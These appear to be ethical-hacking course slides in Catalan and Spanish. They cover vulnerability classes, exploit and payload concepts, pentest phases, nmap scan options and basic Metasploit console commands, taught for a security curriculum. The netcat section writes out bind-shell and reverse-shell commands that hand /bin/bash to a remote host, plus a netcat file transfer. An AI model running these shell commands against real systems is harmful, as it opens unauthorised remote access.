+<p>EXPLOTACIÓ DE VULNERABILITATS TIPUS DE VULNERABILITATS: DESBORDAMENT DE BUFFER • AQUESTA ÉS POTSER LA VULNERABILITAT MÉS CLÀSSICA I HISTÒRICA DE TOTES. • EL DESBORDAMENT DE BUFFER ÉS UN ERROR QUE ES PRODUEIX QUAN S'INTENTA COPIAR UNA QUANTITAT DE DADES MÉS GRAN QUE LA ZONA DE DADES QUE TENIM RESERVADA PER EMMAGATZEMAR.</p>
+<p>• ÉS A DIR, IMAGINA QUE ES TÉ UN BUFFER DE 60 BYTES PER EMMAGATZEMAR INFORMACIÓ I INTENTEM EMMAGATZEMAR 80 BYTES. SI AIXÒ NO ES CONTROLA, ELS 80 BYTES, SOBREESCRIURAN ELS 60 BYTES DEL BUFFER DESTÍ I ELS 20 BYTES RESTANTS S'ESCRIURAN EN POSICIONS CONTIGÜES DE MEMÒRIA AL BUFFER DESTÍ.</p>
+<p>• LES CONSEQÜÈNCIES D'ESCRIURE A UNA ZONA DE MEMÒRIA IMPREVISTA PODEN SER IMPREDICTIBLES. Hacking ètic 1r CIBER</p>
+<p>EXPLOTACIÓ DE VULNERABILITATS TIPUS DE VULNERABILITATS: DESBORDAMENT DE BUFFER</p>
+<ul>
+<li>AQUESTS TIPUS DE VULNERABILITATS PODEN PROVOCAR LA PARADA D'UN SERVEI (DENEGACIÓ DE SERVEI) O, FINS I TOT,</li>
+</ul>
+<p>L'EXECUCIÓ DE CODI ARBITRARI, ÉS A DIR, PODER AGAFAR EL CONTROL DE LA MÀQUINA.</p>
+<ul>
+<li>LA MILLOR MANERA D'EVITAR ELS DESBORDAMENTS DE BUFFER ÉS MITJANÇANT UNA PROGRAMACIÓ SEGURA, TENINT</li>
+</ul>
+<p>MOLTA CURA SEMPRE QUE S'ESCRIGA EN UN BUFFER, PER NO SOBREPASSAR-LO.</p>
+<ul>
+<li>ELS PROGRAMADORS QUE USEN C HAN D'EVITAR UTILITZAR FUNCIONS QUE NO COMPROVEN ELS LÍMITS, COM PODEN SER</li>
+</ul>
+<p>STRCPY(), STRCAT(), SPRINTF(), SCANF(), SSCANF(), FSCANF(), VFSCANF(), VSPRINTF, VSCANF(), VSSCANF (), STREADD(), STRECPY(), STRTRNS(). Hacking ètic 1r CIBER</p>
+<p>EXPLOTACIÓ DE VULNERABILITATS TIPUS DE VULNERABILITATS: RACE CONDITION</p>
+<ul>
+<li>RACE CONDITION ÉS UNA VULNERABILITAT QUE OCORRE QUAN</li>
+</ul>
+<p>UN SISTEMA QUE REALITZA TASQUES EN UNA SEQÜÈNCIA ESPECÍFICA ÉS FORÇAT A REALITZAR DUES O MÉS OPERACIONS SIMULTÀNIAMENT.</p>
+<ul>
+<li>AIXÒ PERMET QUE ELS ATACANTS PRENGUEN AVANTATGE DE</li>
+</ul>
+<p>L'INTERVAL DE TEMPS QUE ES DÓNA ENTRE L'INICI D'UN SERVEI I EL MOMENT EN QUÈ UN CONTROL DE SEGURETAT FA EFECTE.</p>
+<ul>
+<li>AMB LES RACE CONDITION, ELS ATACANTS PODEN ACCEDIR A</li>
+</ul>
+<p>RECURSOS COMPARTITS COM A BASES DE DADES, ARXIUS I OBJECTES EN CODI PER MODIFICAR-LOS SIMULTÀNIAMENT I/O AFECTAR LA INTEGRITAT DEL RECURS. Hacking ètic 1r CIBER</p>
+<p>EXPLOTACIÓ DE VULNERABILITATS TIPUS DE VULNERABILITATS: INTEGER OVERFLOW</p>
+<ul>
+<li>ELS ERRORS PER ‘INTEGER OVERFLOW’ GENERALMENT</li>
+</ul>
+<p>SUCCEEIXEN A L’INTENTAR EMMAGATZEMAR UN VALOR MASSA GRAN A LA VARIABLE ASSOCIADA GENERANT UN RESULTAT INESPERAT (VALORS NEGATIUS, VALORS INFERIORS...).</p>
+<ul>
+<li>AQUEST TIPUS D'ERROR POT TENIR CONSEQÜÈNCIES GREUS</li>
+</ul>
+<p>QUAN EL VALOR QUE GENERA L'INTEGER OVERFLOW ÉS RESULTAT D'ALGUNA ENTRADA D'USUARI (ÉS A DIR, QUE EL POT CONTROLAR) I QUAN, D'AQUEST VALOR, ES PRENEN DECISIONS DE SEGURETAT. Hacking ètic 1r CIBER</p>
+<p>EXPLOTACIÓ DE VULNERABILITATS TIPUS DE VULNERABILITATS: STRING FORMAT</p>
+<ul>
+<li>STRING FORMAT ÉS UNA VULNERABILITAT QUE</li>
+</ul>
+<p>ES PRODUEIX QUAN L'APLICACIÓ AVALUA LES DADES ENVIADES A UNA CADENA COM UNA ORDRE I NO ES VALIDA BÉ L'ENTRADA.</p>
+<div class="terminal-box">
+<div class="terminal-bar">
+<div class="terminal-dots">
+<span class="dot dot-red"></span>
+<span class="dot dot-yellow"></span>
+<span class="dot dot-green"></span>
+</div>
+<div class="terminal-title"> Codi / Comandes</div>
+<div class="terminal-actions">
+<button class="btn-copy" onclick="copyCode(this)" title="Copiar codi">📋 Copiar</button>
+<span class="terminal-lang">BASH</span>
+</div>
+</div>
+<pre><code>• PER EXEMPLE: PRINTF (ARGV[1]);</code></pre>
+</div>
+<ul>
+<li>SI L'ATACANT PASSA COM A PRIMER</li>
+</ul>
+<p>ARGUMENT, UNA CADENA QUE CONTINGA “%X”, PODRIA ARRIBAR A LLEGIR DADES DE LA PILA.</p>
+<p>EXPLOTACIÓ DE VULNERABILITATS TIPUS DE VULNERABILITATS: ALTRES VULNERABILITATS • EXISTEIXEN LLISTES QUE ENS CLASSIFIQUEN AQUESTES VULNERABILITATS</p>
+<ul>
+<li>MITRE TOP 25: VULNERABILITATS RELACIONADES AMB ERRORS DE PROGRAMACIÓ.</li>
+</ul>
+<p>• MITRE TOP 25</p>
+<ul>
+<li>OWASP TOP 10: VULNERABILITATS DE SEGURETAT MÉS CRÍTIQUES EN APLICACIONS WEB.</li>
+</ul>
+<p>• OWASP TOP 10</p>
+<ul>
+<li>SANS TOP 20: VULNERABILITATS QUE REQUEREIXEN SOLUCIÓ IMMEDIATA, COM PODEN SER</li>
+</ul>
+<p>FORATS DE SEGURETAT EN SO, ANTIVIRUS I PROGRAMES PER A BACKUPS, A MÉS DE VULNERABILITATS EN COMPONENTS IMPORTANTS, COM ROUTERS I SWITCHES. • SANS TOP 20</p>
+<p>EXPLOTACIÓ DE VULNERABILITATS TIPUS D’EXPLOTACIÓ</p>
+<ul>
+<li>L'EXPLOTACIÓ DE SISTEMES POT SER ALTAMENT COMPLEXA, PERÒ HI HA FRAMEWORKS QUE SIMPLIFIQUEN LA TASCA. ÉS EL</li>
+</ul>
+<p>CAS DE METASPLOIT FRAMEWORK, QUE ÉS UNA DE LES FERRAMENTES D'AUDITORIA MÉS UTILITZADA, POTENT I VERSÀTIL.</p>
+<ul>
+<li>A CONTINUACIÓ S'ENUMEREN ELS DIFERENTS TIPUS D’EXPLOTACIÓ, ENTRE ALTRES</li>
+<li>EXPLOTACIÓ REMOTA AMB CONNECTIVITAT DIRECTA ENTRE MÀQUINES.</li>
+<li>EXPLOTACIÓ LOCAL DE VULNERABILITATS, GENERALMENT PER ACONSEGUIR ELEVAR PRIVILEGIS A LA MÀQUINA.</li>
+<li>EXPLOTACIÓ A TRAVÉS D'ATACS AL LLOC DEL CLIENT: CLIENT-SIDE ATTACKS.</li>
+</ul>
+<p>Hacking ètic 1r CIBER</p>
+<p>EXPLOTACIÓ DE VULNERABILITATS TIPUS D’EXPLOTACIÓ: REMOTA AMB CONNECTIVITAT DIRECTA En una explotació remota amb connectivitat directa, l'escenari és el següent: ● La màquina A és la de l'atacant i té connectivitat amb la màquina B, que és la màquina d'una organització que té un servidor FTP, web o SSH, per exemple.</p>
+<p>● El software FTP, Web o SSH de la màquina B és vulnerable a alguna vulnerabilitat coneguda, i simplement per tenir connectivitat l'atacant de la màquina A podria llançar un exploit contra la màquina B i agafar el control d'aquesta màquina. Hacking ètic 1r CIBER</p>
+<p>EXPLOTACIÓ DE VULNERABILITATS TIPUS D’EXPLOTACIÓ: LOCAL</p>
+<ul>
+<li>L’EXPLOTACIÓ LOCAL DE VULNERABILITATS PERMET A UN USUARI SENSE</li>
+</ul>
+<p>PRIVILEGI O AMB PRIVILEGIS REDUÏTS PODER SALTAR ELS MECANISMES DE SEGURETAT D'UN SISTEMA OPERATIU AMB L'OBJECTIU DE PODER EXECUTAR ACCIONS PRIVILEGIADES.</p>
+<ul>
+<li>⇩ COM ES REALITZA? ⇩</li>
+<li>UNA VEGADA ES DISPOSE D'UNA SESSIÓ REMOTA, ES POT EXECUTAR UN</li>
+</ul>
+<p>EXPLOIT LOCAL A TRAVÉS D'AQUESTA SESSIÓ.</p>
+<ul>
+<li>ÉS UN TIPUS D’EXPLOTACIÓ MOLT POTENT, JA QUE AMB L'ANTERIOR POT</li>
+</ul>
+<p>SER QUE ACONSEGUIM NOMÉS EL PRIVILEGI DE L'USUARI “NORMAL”, PERÒ AMB AQUEST TIPUS DE VULNERABILITATS S'ACONSEGUEIX OBTENIR EL MÀXIM PRIVILEGI, PER EXEMPLE “SYSTEM” A WINDOWS O “ROOT” A LINUX. Hacking ètic 1r CIBER</p>
+<p>EXPLOTACIÓ DE VULNERABILITATS TIPUS D’EXPLOTACIÓ: CLIENT-SIDE ATTACKS ● Els Client-Side Attacks són atacs que són duts a terme al lloc del client, és a dir, és un usuari el que ha de fer una petició a un servidor controlat per un atacant perquè aquest li torni una resposta maliciosa. Per exemple, un exploit.</p>
+<p>Hacking ètic 1r CIBER</p>
+<p>EXPLOTACIÓ DE VULNERABILITATS TIPUS D’EXPLOTACIÓ: CLIENT-SIDE ATTACKS L'EXEMPLE BÀSIC SERIA EL SEGÜENT</p>
+<ul>
+<li>L'USUARI NORMAL NAVEGA PER INTERNET TRANQUIL·LAMENT.</li>
+<li>ACCEDEIX A UN FÒRUM I LLEGEIX UN MISSATGE QUE CRIDA L'ATENCIÓ.</li>
+<li>EN AQUEST MISSATGE S'ANUNCIA UN PRODUCTE QUE US INTERESSA I HI HA UN LINK PER ACCEDIR A MÉS</li>
+</ul>
+<p>INFORMACIÓ.</p>
+<ul>
+<li>QUAN L'USUARI PUNXA SOBRE EL LINK, EL NAVEGADOR ES DIRIGEIX A UNA ALTRA UBICACIÓ.</li>
+<li>EL LLOC WEB AL QUAL S'ACCEDEIX POT SER LEGÍTIM, PERÒ SUPOSEM QUE ALGÚ DE MANERA</li>
+</ul>
+<p>MALINTENCIONADA HA COL·LOCAT UN CODI HTML EN AQUEST LLOC QUE OBLIGA EL NAVEGADOR DE L'USUARI A FER UNA PETICIÓ A UN ALTRE DOMINI. Hacking ètic 1r CIBER</p>
+<p>EXPLOTACIÓ DE VULNERABILITATS TIPUS D’EXPLOTACIÓ: CLIENT-SIDE ATTACKS L'EXEMPLE BÀSIC SERIA EL SEGÜENT</p>
+<ul>
+<li>EL DOMINI EN QÜESTIÓ ÉS MALICIÓS I EL GESTIONA L'ATACANT.</li>
+<li>EN REBRE LA PETICIÓ, LA QUAL S'HA FET DE FORMAR TRANSPARENT, S'ENVIA UN HTML MALICIÓS, QUE CONTÉ</li>
+</ul>
+<p>UN EXPLOIT PER A UNA VERSIÓ CONCRETA DEL NAVEGADOR DE LA VÍCTIMA.</p>
+<ul>
+<li>QUAN EL NAVEGADOR EXECUTA EL FITXER HTML ES TROBA QUE L'EXPLOIT APROFITA LA VULNERABILITAT I</li>
+</ul>
+<p>S'ACONSEGUEIX EXECUTAR CODI ARBITRARI DE MANERA REMOTA. Hacking ètic 1r CIBER</p>
+<p>EXPLOTACIÓ DE VULNERABILITATS EXPLOIT Hacking ètic 1r CIBER Els exploits són programes maliciosos (malware) que contenen dades o codis executables, que s'aprofiten de les vulnerabilitats del software.</p>
+<ul>
+<li>Hi pot haver un parxe que soluciona la</li>
+</ul>
+<p>vulnerabilitat.</p>
+<ul>
+<li>No hi ha un parxe per solucionar la</li>
+</ul>
+<p>vulnerabilitat, cas denominat 0-day. És un codi especialment preparat per explotar una vulnerabilitat per a la qual</p>
+<ul>
+<li>IP destí.</li>
+<li>Port destí.</li>
+<li>Altres paràmetres propis de la vulnerabilitat.</li>
+<li>Payload.</li>
+</ul>
+<p>Normalment, són petits programes en què l'atacant només ha d'especificar</p>
+<p>EXPLOTACIÓ DE VULNERABILITATS EXPLOIT: TIPUS</p>
+<ul>
+<li>ELS EXPLOITS PODEN SER DE DOS TIPUS</li>
+<li>ACTIUS: SÓN ELS EXPLOITS QUE EXPLOTEN UNA MÀQUINA</li>
+</ul>
+<p>OBJECTIU, MITJANÇANT FORÇA BRUTA, FINS INJECTAR EL PAYLOAD O TROBAR UN ERROR.</p>
+<ul>
+<li>PASSIUS: SÓN ELS EXPLOITS QUE ESPEREN A QUE UNA MÀQUINA</li>
+</ul>
+<p>VÍCTIMA ES CONNECTE A LA MÀQUINA HOST PER A EXPLOTAR- LOS (SOL SER A TRAVÉS DELS NAVEGADORS O CLIENTS FTP). Hacking ètic 1r CIBER</p>
+<p>EXPLOTACIÓ DE VULNERABILITATS PAYLOAD</p>
+<ul>
+<li>MENTRE QUE AMB L'EXPLOIT S'EXPLOTA UNA VULNERABILITAT</li>
+</ul>
+<p>DEL PROGRAMA, AMB EL PAYLOAD S'EXECUTA UNA ACCIÓ PROFITOSA PER A L'ATACANT.</p>
+<ul>
+<li>EL PAYLOAD ÉS UN ALTRE FRAGMENT DE CODI QUE VA</li>
+</ul>
+<p>SEMPRE ASSOCIAT A L'EXPLOIT.</p>
+<ul>
+<li>UN EXEMPLE D’EXPLOTACIÓ PODRIA SER</li>
+<li>EXECUTEM UN EXPLOIT EN UN SISTEMA VULNERABLE.</li>
+<li>A AQUEST EXPLOIT LI ASSOCIEM UN PAYLOAD QUE</li>
+</ul>
+<p>CREARÀ UN USUARI ADMINISTRADOR AL SISTEMA AMB CREDENCIALS CONEGUDES.</p>
+<p>EXPLOTACIÓ DE VULNERABILITATS FERRAMENTES • METASPLOIT FRAMEWORK: PERMET L'EXPLOTACIÓ DE VULNERABILITATS A DIFERENTS SISTEMES OPERATIUS I FACILITA L'EXECUCIÓ D'EXPLOITS APROFITANT VULNERABILITATS CONEGUDES. COMPTA AMB UNA GRAN COMUNITAT DONANT SUPORT. • COBALT STRIKE: PRODUCTE DE PROVES DE PENETRACIÓ, DE PAGAMENT, QUE PERMET A UN ATACANT DESPLEGAR UN AGENT ANOMENAT "BEACON", QUE TÉ UNA GRAN QUANTITAT DE FUNCIONALITATS PER A L'ATACANT: EXECUCIÓ D'ORDRES, REGISTRE DE CLAUS, TRANSFERÈNCIA DE FITXERS, ESCALADA DE PRIVILEGIS, EXPLORACIÓ DE PORTS, MOVIMENT LATERAL, ETC.</p>
+<p>• PUPY RAT: APLICACIÓ PER CREAR PORTES TRASERES, REALITZAR ACCIONS PER CONNECTAR-SE A SISTEMES REMOTS, REALITZAR EXPLOITS PER RECOLLIR DADES, AUGMENTAR ELS PRIVILEGIS DE DESCARREGAR I CARREGAR FITXERS, CAPTURAR LA PANTALLA O PULSACIONS DE TECLES, ETC.</p>
+<hr/>
+<h2 id="ut1602">16.2 Metasploit</h2>
+<p>Hacking Ético 23AI32CF016 Raúl Fuentes Ferrer</p>
+<p>PLANNING</p>
+<h3>1. Introducción al Framework</h3>
+<ul>
+<li>Arquitectura</li>
+<li>Módulos</li>
+<li>Comandos básicos</li>
+<li>Fingerprinting desde Metasploit</li>
+</ul>
+<h3>2. Exploiting &amp; Payloads</h3>
+<ul>
+<li>Tipos de payloads</li>
+<li>Intrusión sin interacción</li>
+<li>Ejemplo</li>
+<li>Intrusión con interacción</li>
+<li>Client-Side</li>
+<li>Elevación local de privilegios</li>
+</ul>
+<h3>3. Post-Explotación</h3>
+<ul>
+<li>Funcionalidades</li>
+<li>Recolección de información y ámbito</li>
+<li>Módulos de Meterpreter</li>
+<li>¿Qué me permite?</li>
+</ul>
+<p>ii. ¿Qué puedo hacer yo? iii. Mimikatz</p>
+<ul>
+<li>Pass the hash</li>
+<li>psexec y psexec_psh (powershell)</li>
+</ul>
+<h3>4. Herramientas del framework</h3>
+<ul>
+<li>msfvenom</li>
+<li>Evasión AV (shellter, veil-framework)</li>
+</ul>
+<h3>5. Desarrollo en el framework</h3>
+<ul>
+<li>Genera tu script de Meterpreter</li>
+</ul>
+<p>Disclaimer: La información contenida en esta presentación sólo es para fines educativos por lo cual no me hago responsable por el uso indebido de ella.</p>
+<p>FASES TEST INTRUSIÓN Fases test de intrusión</p>
+<ul>
+<li>Contrato</li>
+<li>Recolección información (gathering)</li>
+<li>Análisis (thinking…)</li>
+<li>Explotación (el arte de la intrusión)</li>
+<li>Post-Explotación ó ¿Qué más puedo rascar?</li>
+<li>Generación de informes</li>
+<li>(¿divertido?)</li>
+</ul>
+<p>KALI LINUX</p>
+<ul>
+<li>Auditoría interna</li>
+<li>Auditoría externa</li>
+<li>En el mundo del forense</li>
+</ul>
+<p>RECOGIDA DE INFORMACIÓN</p>
+<p>RECOGIDA DE INFORMACIÓN: FOOTPRINT</p>
+<ul>
+<li>Este proceso se centra en la recolección de información pública de</li>
+</ul>
+<p>Internet, por lo que su uso no conlleva la vulneración de ninguna ley, y por tanto no es considerada delito.</p>
+<ul>
+<li>Esta fase no suele realizarse en un proceso de auditoría interna o auditoría</li>
+</ul>
+<p>de red, o sí se realiza, es de manera superficial, ya que no es habitual que se filtre información interna del organismo que pueda sernos de utilidad en este ámbito.</p>
+<ul>
+<li>Para realizar un footprint de un organismo necesitaremos conocer una serie</li>
+</ul>
+<p>de herramientas de auditoría de seguridad que veremos a continuación.</p>
+<p>RECOGIDA DE INFORMACIÓN: FOOTPRINT</p>
+<ul>
+<li>Google</li>
+</ul>
+<p>(Hacking): Aprenderemos a utilizar algunos verbos de Google para realizar búsquedas avanzadas.</p>
+<ul>
+<li>Bing (Hacking): De la misma manera que con Google Hacking, estudiaremos los verbos</li>
+</ul>
+<p>básicos que todo auditor debe conocer del buscador de Microsoft.</p>
+<ul>
+<li>Shodan: Buscador de activos online muy interesante para identificar webcams, impresoras,</li>
+</ul>
+<p>scada, etc. expuestos en Internet.</p>
+<ul>
+<li>Anubis: Herramienta que contiene un gran set de utilidades para recolectar información.</li>
+</ul>
+<p>Automatizaremos varias búsquedas con ésta herramienta.</p>
+<ul>
+<li>FOCA Final Version: Herramienta privativa similar a Anubis que cuenta además con</li>
+</ul>
+<p>funcionalidades avanzadas de análisis de metadatos.</p>
+<ul>
+<li>Servicios online: Distintos servicios online que podrán ser de gran utilidad en un proceso de</li>
+</ul>
+<p>auditoría como Cuwhois, Robtex, Netcraft, Chatox,</p>
+<p>RECOGIDA DE INFORMACIÓN: FOOTPRINT</p>
+<ul>
+<li>Si te apetece investigar en auditoría externa o web, te recomiendo la</li>
+</ul>
+<p>lectura del libro “La Biblia del Footprinting”</p>
+<p>RECOGIDA DE INFORMACIÓN: FINGERPRINT</p>
+<ul>
+<li>Este proceso se centra en buscar información sobre los objetivos que han</li>
+</ul>
+<p>sido localizados durante la fase de Footprint, con el fin de utilizar esa información para buscar en la próxima fase vulnerabilidades que padezcan los sistemas</p>
+<ul>
+<li>Principalmente nos centraremos en analizar los servicios que se encuentran</li>
+</ul>
+<p>escuchando tras cada máquina localizada (puertos abiertos) para averiguar sus sistemas operativos y aplicaciones que se encuentran operando</p>
+<ul>
+<li>Para ello necesitaremos conocer una serie de herramientas de auditoría de</li>
+</ul>
+<p>seguridad que veremos a continuación.</p>
+<p>RECOGIDA DE INFORMACIÓN: FINGERPRINT TIPOS</p>
+<ul>
+<li>Pasivo: escucha una red y analiza paquetes para identificar</li>
+</ul>
+<p>máquinas y servicios</p>
+<ul>
+<li>Satori</li>
+<li>Network Minner</li>
+<li>Activo: explora una red en busca de máquinas y servicios</li>
+<li>Nmap</li>
+<li>Fing</li>
+</ul>
+<p>RECOGIDA DE INFORMACIÓN: NMAP Parámetro Descripción y Ejemplo -sN Permite realizar un escaneo de tipo Null Scan. Ejemplo: nmap –sN &lt;dirección IP&gt; -sF Permite realizar un escaneo de tipo FIN Scan. Ejemplo: nmap –sF &lt;dirección IP&gt; -sX Permite realizar un escaneo de tipo XMAS Scan. Ejemplo</p>
+<p>nmap –sX &lt;dirección IP&gt; -p Se Indica sobre qué puertos se debe realizar el escaneo. Ejemplo: nmap –p 139,80,3389 &lt;dirección IP&gt;. Para indicar rangos especificamos el puerto de la siguiente manera 80</p>
+<h3>1500. Se realizará un análisis desde el puerto 80 hasta el</h3>
+<p>1500</p>
+<p>RECOGIDA DE INFORMACIÓN: NMAP Parámetro Descripción y Ejemplo -A Este parámetro habilita la detección del sistema operativo, además de las versiones de servicios y del propio sistema. Ejemplo: nmap –A &lt;dirección IP&gt; -sI Permite realizar un escaneo de tipo idle. Ejemplo: nmap –P0 –p – -sI &lt;dirección zombie&gt; &lt;dirección víctima&gt;. Cabe destacar que la opción –p – permite realizar un escaneo sobre todos los puertos de la máquina, esta acción puede provocar que el escaneo se ralentice en gran medida -sV Obtener las versiones de los productos. Ejemplo: nmap –sV &lt;dirección IP&gt;</p>
+<p>RECOGIDA DE INFORMACIÓN: NMAP</p>
+<ul>
+<li>Nmap</li>
+</ul>
+<p>NETCAT: TOOLS</p>
+<ul>
+<li>Netcat es conocido como una navaja suiza TCP/IP</li>
+<li>Podemos usarlo para una multitud de propósitos</li>
+<li>Ncat es una reimplementación moderna de Netcat por el Proyecto</li>
+</ul>
+<p>Nmap</p>
+<p>NETCAT: TOOLS</p>
+<ul>
+<li>Conectarse a un puerto</li>
+</ul>
+<p>root@kali:~# nc -v 10.0.0.100 80 nc: 10.0.0.100 (10.0.0.100) 80 [http] open root@kali:~# nc -v 10.0.0.100 81 nc: cannot connect to 10.0.0.100 (10.0.0.100) 81 [81]: Connection refused nc: unable to connect to address 10.0.0.100, service 81</p>
+<p>NETCAT: TOOLS</p>
+<ul>
+<li>Establecer una conexion Netcat a la escucha (listener)</li>
+</ul>
+<p>root@kali:~# nc -lvp 1234 nc: listening on :: 1234 ... nc: listening on 0.0.0.0 1234 ...</p>
+<ul>
+<li>En otro terminal conectar al puerto especificado</li>
+</ul>
+<p>root@kali:~# nc 10.0.0.100 1234 Hola</p>
+<p>NETCAT: TOOLS</p>
+<ul>
+<li>Establecer una shell a la escucha (listener)</li>
+</ul>
+<p>root@kali:~# nc -lvp 1234 -e /bin/bash nc: listening on :: 1234 ... nc: listening on 0.0.0.0 1234 ...</p>
+<ul>
+<li>En otro terminal</li>
+</ul>
+<p>root@kali:~# nc 10.0.0.100 1234 whoami root</p>
+<p>NETCAT: TOOLS Enviar una shell al listener</p>
+<ul>
+<li>Establecer a la escucha (listener)</li>
+</ul>
+<p>root@kali:~# nc -lvp 1234</p>
+<ul>
+<li>Conectarse desde otra terminal</li>
+</ul>
+<p>root@kali:~# nc 10.0.0.100 1234 -e /bin/bash</p>
+<p>NETCAT: TOOLS Enviar archivos</p>
+<ul>
+<li>Establecer a la escucha y Redirigir salida a un fichero</li>
+</ul>
+<p>root@kali:~# nc -lvp 1234 &gt; netcatfile</p>
+<ul>
+<li>Enviar un archivo desde otro terminal</li>
+</ul>
+<p>root@kali:~# nc 10.0.0.100 1234 &lt; mydirectory/myfile</p>
+<p>METASPLOIT FRAMEWORK</p>
+<p>INTRO A METASPLOIT FRAMEWORK Software fiable: es aquel que hace lo que se supone que debe hacer Software seguro: es aquel que hace lo que se supone que debe hacer, y nada más</p>
+<p>INTRO A METASPLOIT FRAMEWORK</p>
+<ul>
+<li>Metasploit Framework: Herramienta open source para el desarrollo y ejecución de</li>
+</ul>
+<p>exploits contra una máquina remota.</p>
+<ul>
+<li>Versiones (- todas tienen como base MSF)</li>
+</ul>
+<p>. https://www.rapid7.com/products/metasploit/download/editions/</p>
+<ul>
+<li>Metasploit Framework – Versión gratuita para developers and security researchers.</li>
+<li>Metasploit Pro – edición profesional open-core para pentesters and IT Teams(GUI,</li>
+</ul>
+<p>integra nmap, recolección de evidencias automática y de fuerza bruta + escaneo y explotación de aplicaciones web, ingeniería social y VPN pivoting). Mayor numero de módulos especializados y realización de informes.</p>
+<p>INTRO A METASPLOIT FRAMEWORK</p>
+<ul>
+<li>Bug o Vulnerabilidad - Es el resultado de un fallo de programación introducido en el</li>
+</ul>
+<p>proceso de creación de programas de ordenadores.</p>
+<ul>
+<li>Exploit - Medio por el cual el atacante aprovecha una debilidad/vulnerabilidad de la</li>
+</ul>
+<p>red, aplicación o servicio.</p>
+<ul>
+<li>Payload - Programa o código que se traspasa a la víctima. Metasploit tiene payloads</li>
+</ul>
+<p>pre-diseñados y permite construir otras propias.</p>
+<ul>
+<li>Módulo - pieza de software intercambiable utilizada por Metasploit. Hay varios tipos</li>
+</ul>
+<p>de módulos</p>
+<ul>
+<li>Listener - Componente que escucha las conexiones del sistema atacante al sistema</li>
+</ul>
+<p>objetivo. También conocido como handler.</p>
+<ul>
+<li>0-day - Es un código malicioso que permitirá a un atacante obtener el control</li>
+</ul>
+<p>remoto de un sistema, como particularidad hay que recalcar que la vulnerabilidad de la que se aprovecha este exploit es desconocida por los usuarios y el fabricante del producto en muchos casos. Es un bug sin parche.</p>
+<p>INTRO A METASPLOIT FRAMEWORK Metasploit dispone de varias interfaces con las que interaccionar con el framework</p>
+<ul>
+<li>Msfconsole – Consola desde la cual podemos utilizar todas las opciones.</li>
+<li>Armitage – Interfaz gráfica para el framework (apt-get install armitage)</li>
+</ul>
+<p>https://haxor.no/en/article/armitage-kali</p>
+<p>MÓDULOS Módulos del framework</p>
+<ul>
+<li>Auxiliary: Permite la interacción de herramientas externas como pueden ser</li>
+</ul>
+<p>Escaners de vulnerabilidades, Sniffers, etc… con el framework de Metasploit</p>
+<ul>
+<li>Encoders: Proporciona algoritmos par codificar y ofuscar los payloads que</li>
+</ul>
+<p>utilizaremos tras haber tenido éxito el exploit</p>
+<ul>
+<li>Exploits: Aquí se encuentran todos los exploits disponibles en el “framework” para</li>
+</ul>
+<p>conseguir acceso a los diferentes SO’s</p>
+<ul>
+<li>Payloads: Nos proporciona gran cantidad de códigos “maliciosos” que podremos</li>
+</ul>
+<p>ejecutar una vez haya tenido éxito el “exploit”</p>
+<ul>
+<li>Post: Nos proporciona funcionalidades para la fase de “post” explotación como</li>
+</ul>
+<p>recolección de información, etc…</p>
+<ul>
+<li>Nops: Nos permite realizar u obtener operaciones NOP para evadir antivirus, IDS,</li>
+</ul>
+<p>etc…</p>
+<p>MÓDULOS</p>
+<ul>
+<li>Estructura de directorios (Importante)</li>
+<li>Modules/exploits/&lt;OS/Platform&gt;/&lt;Protocol/Service/Local…&gt;/file.rb</li>
+</ul>
+<p>INTRO A METASPLOIT FRAMEWORK</p>
+<ul>
+<li>Lanzamos la orden msfconsole desde el terminal que nos devolverá el identificador</li>
+</ul>
+<p>msf &gt; para introducir las órdenes.</p>
+<ul>
+<li>Previamente será bueno actualizarlo: root@kali.~# msfupdate</li>
+<li>La consola MSF es como un mini-sistema de archivos donde las carpetas que</li>
+</ul>
+<p>cuelgan de él se encuentran físicamente en la ruta dónde se ha instalado el framework. Ejemplos</p>
+<ul>
+<li>Los exploits de Windows esta en la ruta exploit/windows/&lt;..&gt;</li>
+<li>Los módulos auxiliares en auxiliary/&lt;...&gt;</li>
+<li>Los encoders en encoders/&lt;tecnologia&gt;</li>
+</ul>
+<p>COMANDOS BÁSICOS Órdenes de ayuda msf &gt; help – lista las órdenes separadas en dos listados: Órdenes del núcleo de msf Órdenes de interacción con bases de datos. -h permite obtener información de órdenes concretas. Orden de búsqueda Útil para la búsqueda de módulos por alguna característica o determinar si el framework esta actualizado.</p>
+<p>msf &gt; search -h</p>
+<p>COMANDOS BÁSICOS info – aporta información sobre el módulo seleccionado bien con la orden use (que permite seleccionar un módulo), bien especificando la ruta: msf &gt; use exploit/multi/handler msf &gt; info msf &gt; info &lt;ruta&gt; show – muestra las diferentes opciones para los módulos del framework, exploits, payload, encoders, nops, etc.</p>
+<p>COMANDOS BÁSICOS Órdenes de interacción y configuración: back – permite salir del módulo (contrario a use) set y setg – asignan valores a variables: set para un módulo, setg para en contexto del framework. unset y unsetg – desasignan valores a parámetros o variables connect – permite conectarnos a otra máquina para su gestión o administración dado la dirección IP y el puerto.</p>
+<p>irb – permite ejecutar un interprete de Ruby para el framework para ejercutar órdenes y scripts. load, unload y loadpath – load/unload especifica el plugins a cargar/descargar, o directorio donde se almacenan (loadpath)</p>
+<p>COMANDOS BÁSICOS check – permite verificar si un sistema es vulnerable a cierta vulnerabilidad antes de lanzar el script. exploit – lanza el código malicioso, una vez seleccionado y configurado el módulo, sobre la máquina, o prepara el entorno para vulnerar la máquina. Devuelve el control mediante un shell o un Meterpreter (Meta-interprete: payload que permite cargar e inyectar en un programa del sistema atacado las extensiones que hemos desarrollado en formato .dll).</p>
+<p>Opciones: -j ejecutar exploit en segundo plano -z no se interactúa con la sesión tras explotación exitosa -e lanza el paylod con la codificación establecida</p>
+<p>COMANDOS BÁSICOS sessions – las shells obtenidas en sistemas vulnerados se organizan por sesiones. Esta orden permite ver las sesiones que tenemos abiertas: -l lista sesiones disponibles -v muestra información extra -s &lt;script&gt; ejecuta script sobre todas las sesiones del Meterpreter -K finaliza todas las sesiones abiertas -c &lt;orden&gt; ejecutar órdenes sobre sesiones abiertas del meterpreter -u permite actualizar la shell remota tipo Win32 a un meterpreter especificando la sesión.</p>
+<p>-i especifican sesión con la que interaccionar.</p>
+<p>COMANDOS BÁSICOS resource – permite la carga de un archivo (.rc) con acciones especificas sobre el framework para automatizar tareas. makerc – almacena en un archivo el historial de órdenes y acciones que se han realiza en la sesión en curso (nombre-usuario en el directorio .msfX) save – aporta persistencia a la configuración del entorno, especialmente es test complicados y largos (archivo config en .msfX).</p>
